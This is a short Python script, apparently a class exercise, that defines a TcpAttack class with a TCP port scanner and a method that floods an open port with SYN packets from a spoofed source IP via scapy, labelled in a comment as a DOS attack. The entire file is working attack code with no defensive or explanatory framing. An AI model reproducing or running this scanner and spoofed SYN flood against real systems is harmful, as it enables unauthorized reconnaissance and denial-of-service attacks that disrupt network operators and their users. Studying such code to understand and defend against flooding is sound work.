#! /usr/bin/env python3

import socket
from scapy.all import *

class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []


    def scanTarget(self, rangeStart, rangeEnd):

        for testport in range(rangeStart, rangeEnd+1):
            print("testing", testport)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            try:
                sock.connect((self.targetIP, testport))
                self.open_ports.append(testport)
            except:
                pass

        with open("openports.txt", "w") as fp:
            for port in self.open_ports:
                fp.write("%d\n"%(port))


    def attackTarget(self, port, numSyn):

        if port not in self.open_ports:
            return 0

        # perform DOS attack
        for i in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header/TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)
        return 1


